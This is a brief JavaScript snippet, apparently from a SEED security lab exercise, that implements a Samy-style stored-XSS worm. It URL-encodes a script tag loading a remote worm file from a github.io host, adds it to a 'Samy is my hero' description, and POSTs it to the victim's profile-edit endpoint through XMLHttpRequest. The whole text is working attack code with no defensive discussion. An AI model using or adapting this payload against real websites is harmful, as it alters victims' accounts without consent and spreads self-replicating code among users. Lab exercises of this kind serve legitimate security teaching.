// Define the worm code that will be injected into the victim's profile
var wormCode = encodeURIComponent(
    "<script type=\"text/javascript\" " +
    "id=\"worm\" " +
    "src=\"https://n1ck-n4m3.github.io/js/xss_worm.js\">" + 
    "</" + "script>"
);

// Construct the description field with the worm code and some text
var desc = "&description=Samy is my hero " + wormCode;
desc += "&accesslevel[description]=2";  //

// URL for sending the profile modification request
var sendurl = "http://www.seed-server.com/action/profile/edit";  //

// Create and send the Ajax request to modify the victim's profile
var Ajax = new XMLHttpRequest();
Ajax.open("POST", sendurl, true);
Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
Ajax.send(desc);  //
